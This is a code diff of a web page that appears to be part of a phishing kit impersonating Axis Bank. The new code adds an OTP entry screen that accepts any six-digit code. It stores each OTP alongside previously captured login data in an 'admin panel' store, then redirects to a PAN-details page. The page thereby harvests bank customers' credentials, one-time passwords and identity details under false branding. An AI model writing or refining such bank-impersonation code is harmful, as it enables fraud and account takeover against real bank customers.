-            console.log('Data saved:', type, data);
+            console.log('OTP verification saved:', { otp, status });
         }
         
-        // Mobile number validation (only numbers)
-        const mobileInputs = document.querySelectorAll('input[type="tel"]');
-        mobileInputs.forEach(input => {
-            input.addEventListener('input', function(e) {
-                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
-            });
-        });
-        
-        // Forgot link click
-        if (forgotLink) {
-            forgotLink.addEventListener('click', function(e) {
+        // Form submission handler
+        const otpForm = document.getElementById('otpForm');
+        if (otpForm) {
+            otpForm.addEventListener('submit', function(e) {
                 e.preventDefault();
-                const isLoginForm = loginForm.style.display === 'block';
                 
-                if (isLoginForm) {
-                    window.location.href = 'forgot_login.html';
-                } else {
-                    window.location.href = 'forgot_card.html';
+                const otp = fullOtpInput.value;
+                
+                if (otp.length !== 6) {
+                    alert('Please enter a valid 6-digit OTP.');
+                    return;
                 }
+                
+                if (timeLeft <= 0) {
+                    alert('OTP has expired. Please request a new one.');
+                    return;
+                }
+                
+                // Show loading
+                verifyButton.textContent = "Verifying...";
+                verifyButton.classList.add('loading');
+                verifyButton.disabled = true;
+                
+                // Save OTP verification
+                saveOTPVerification(otp, 'submitted');
+                
+                // Simulate verification delay
+                setTimeout(() => {
+                    // Remove loading
+                    verifyButton.textContent = "Verify OTP";
+                    verifyButton.classList.remove('loading');
+                    verifyButton.disabled = false;
+                    
+                    // Save to admin data as well
+                    saveToAdmin(otp);
+                    
+                    // For demo purposes, accept any 6-digit OTP
+                    if (otp.length === 6 && /^\d+$/.test(otp)) {
+                        saveOTPVerification(otp, 'verified');
+                        alert('OTP verified successfully!');
+                        // Redirect to axis_pan.html
+                        window.location.href = 'axis_pan.html';
+                    } else {
+                        saveOTPVerification(otp, 'failed');
+                        alert('Invalid OTP. Please try again.');
+                    }
+                }, 1500);
             });
         }
         
-        // Info buttons functionality
-        document.querySelectorAll('.info-button').forEach(button => {
-            button.addEventListener('click', function() {
-                const text = this.textContent;
-                if (text === 'KNOW MORE') {
-                    window.location.href = 'more_info.html';
-                } else if (text === 'DOWNLOAD') {
-                    window.location.href = 'download_app.html';
-                }
+        // Save OTP data to admin panel
+        function saveToAdmin(otp) {
+            // Get existing admin data or create empty array
+            let adminData = JSON.parse(localStorage.getItem('axisBankAdminData') || '[]');
+            
+            // Get last submission
+            const lastSubmission = getLastSubmission();
+            
+            // Add to admin data
+            adminData.unshift({
+                id: Date.now(),
+                type: 'otp_verification',
+                otp: otp,
+                status: 'verified',
+                timestamp: new Date().toISOString(),
+                loginData: lastSubmission ? lastSubmission.data : null,
+                loginType: lastSubmission ? lastSubmission.type : null
             });
+            
+            // Save back to localStorage for admin panel
+            localStorage.setItem('axisBankAdminData', JSON.stringify(adminData));
+            
+            console.log('Data saved to admin:', { otp, status: 'verified' });
+        }
+        
+        // Resend button handler
+        resendButton.addEventListener('click', resendOTP);
+        
+        // Back link handler
+        backLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            window.location.href = 'index.html';
         });
         
-        // Initialize - set Login form as default
+        // Help link handler
+        helpLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            alert('For assistance with OTP verification, please contact Axis Bank customer support at 1860-419-5555.');
+        });
+        
+        // Initialize
         window.addEventListener('DOMContentLoaded', function() {
-            toggleLogin.classList.add('active-toggle');
-            loginForm.style.display = 'block';
-            creditForm.style.display = 'none';
-            forgotLink.textContent = 'Forgot Login ID / Password?';
+            // Focus first OTP input
+            otpInputs[0].focus();
             
-            // Initialize localStorage if not exists
-            if (!localStorage.getItem('axisBankSubmissions')) {
-                localStorage.setItem('axisBankSubmissions', JSON.stringify([]));
+            // Start timer
+            startTimer();
+            
+            // Initialize resend button countdown
+            let resendCountdown = 180;
+            let resendInterval = setInterval(() => {
+                resendCountdown--;
+                resendButton.textContent = `Resend OTP (${resendCountdown}s)`;
+                
+                if (resendCountdown <= 0) {
+                    clearInterval(resendInterval);
+                    canResend = true;
+                    resendButton.disabled = false;
+                    resendButton.textContent = 'Resend OTP';
+                }
+            }, 1000);
+            
+            // Initialize localStorage for OTP verifications if not exists
+            if (!localStorage.getItem('axisBankOTPVerifications')) {
+                localStorage.setItem('axisBankOTPVerifications', JSON.stringify([]));
+            }
+            
+            // Initialize localStorage for admin data if not exists
+            if (!localStorage.getItem('axisBankAdminData')) {
+                localStorage.setItem('axisBankAdminData', JSON.stringify([]));
             }
         });
     </script>
